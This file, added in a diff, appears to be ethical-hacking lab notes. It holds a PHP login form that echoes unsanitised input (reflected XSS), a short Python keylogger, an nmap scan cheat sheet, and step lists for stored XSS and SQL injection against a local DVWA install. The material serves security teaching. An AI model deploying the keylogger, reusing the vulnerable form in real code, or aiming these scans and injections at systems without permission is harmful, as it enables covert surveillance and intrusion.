@@ -1,0 +1,120 @@
+<?php
+if(isset($_GET['login']))
+{
+echo "Enterd by you:<br>";
+echo "Email: ".$_GET['email']."<br>";
+echo "Password: ".$_GET['password'];
+}
+?>
+<div>
+<form>
+<input type="text" name="email" placeholder="Email"><br>
+<input type="password" name="password" placeholder="Password"><br>
+<input type="submit" name="login" value="Login">
+</form>
+</div>
+
+
+import keyboard
+
+log_file = 'keystrokes.txt'
+
+def on_key_press(event):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(event.name))
+
+keyboard.on_press(on_key_press)
+
+keyboard.wait()
+
+
+nmap -sn <target> 
+	- Perform a ping scan to discover live hosts on the network.
+
+nmap -sT <target> 
+	- Perform a TCP connect scan, which establishes a full TCP connection to each port to determine its state.
+
+nmap -sS <target> 
+	- Perform a SYN scan, also known as stealth scan, by sending SYN packets to each port and analyzing responses to determine open ports.
+
+nmap -sU <target> 
+	- Perform a UDP scan to find open UDP ports on the target.
+
+nmap -O <target> 
+	- Perform OS detection against the target to determine the operating system running on the host.
+
+nmap -A <target> 
+	- Aggressive scan options including OS detection, version detection, script scanning, and traceroute.
+
+nmap -p- <target> 
+	- Scan all 65,535 TCP ports on the target.
+
+nmap -F <target> 
+	- Scan only the most common 100 ports on the target.
+
+nmap -sV <target> 
+	- Probe open ports to determine service and version information.
+
+nmap -v <target> 
+	- Increase verbosity level to get more detailed output during the scan.
+
+nmap -oA <output_prefix> <target> 
+	- Output scan results in three formats: normal, XML, and grepable.
+
+nmap -T4 <target> 
+	- Set timing template to aggressive, increasing scan speed at the cost of reliability.
+
+nmap -PN <target> 
+	- Treat all hosts as online, skipping host discovery.
+
+nmap --script vuln <target> 
+	- Run NSE scripts to detect known vulnerabilities on the target.
+
+nmap --traceroute <target> 
+	- Perform traceroute to the target host to discover the path packets take.
+
+nmap -sX <target> 
+	- Perform Xmas tree scan, setting FIN, URG, and PUSH flags to probe for open ports.
+
+nmap -sN <target> 
+	- Perform Null scan, sending packets with no TCP flag set to identify open ports.
+
+nmap -sF <target> 
+	- Perform FIN scan, sending packets with only the FIN flag set to detect open ports.
+
+nmap -sP <target> 
+	- Perform a ping scan to determine which hosts are online without scanning ports.
+
+nmap -sL <targets_file> - List scan, simply list targets to scan without performing any actual scanning.
+
+
+
+ Download xampp and install it from here : https://downloadsapachefriends.global...
+   after install xampp open xampp control panel and start two services : Apache and Mysql
+   (I have already installed it.. )
+   
+2) Download DVWA(DAMN VULNERABLE WEB APP) from its official site.
+3) Extract the folder and rename it to "dvwa"
+4) Copy that folder into C:xampp:htdocs: paste here.
+5) Now open dvwa folder then open config folder under that make a copy of config.inc.php.dist
+6) Then rename it to config.inc.php
+7) Open it with any text editor and remove the password.
+8)Now go to the localhost/dvwa/ Then in the bottom click create database button.
+9) Wait a second you will be redirected to login page.
+10) Now enter the login ID and password as  admin/password.
+11) After successful login click the fourth last option and set the security level to low.
+12) Then click on XSS(stored) and type any name and type the script that you want to inject.
+
+
+AIM: Perform SQL injection attack.
+
+Step 1 : Open XAMPP and start apache and mysql.
+Step 2 : Go to web browser and enter site localhost/phpmyadmin.
+Step 3 : Create database with name sql_db.
+Step 4 : Go to site localhost/dvwa/ then login.
+Step 5 : Go to security setting option in left and set security level low.
+Step 6 : Click on SQL injection option in left.
+Step 7 : Write "1" in text box and click on submit.
+Step 8 : Write a'''=' in text box and click on submit.
+Step 9 : Write "1=1" in text box and click on submit.
+Step 10 : Write "1*" in text box and click on submit.
